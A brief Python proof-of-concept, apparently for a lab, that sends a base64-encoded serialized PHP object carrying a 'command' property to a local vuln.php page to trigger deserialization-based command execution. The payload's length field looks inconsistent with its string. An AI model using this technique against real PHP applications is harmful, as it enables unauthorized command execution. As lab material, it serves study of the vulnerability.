#!/usr/bin/env python3

import base64
import requests

if __name__ == "__main__":
    deser = 'O:6:"MySink":1:{s:7:"command";s:3:"\>sl";}'
    deser = base64.b64encode(deser.encode()).decode()
    print(deser)
    r = requests.get("http://127.0.0.1/vuln.php" + "?code=" + deser)
    print(r.text)

